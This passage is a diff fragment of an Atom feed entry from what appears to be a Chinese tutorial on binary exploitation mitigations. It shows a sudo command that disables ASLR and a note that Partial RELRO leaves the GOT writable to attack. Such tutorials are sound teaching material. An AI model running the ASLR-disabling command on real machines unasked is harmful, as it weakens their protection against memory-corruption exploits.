+<pre><code class="language-javascript">$ sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre>
+<h3 id="0x04-relro">0x04 <strong>RELRO</strong></h3>
+<p>设置符号重定向表为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p>
+]]></content>
+    </entry>
+</feed>
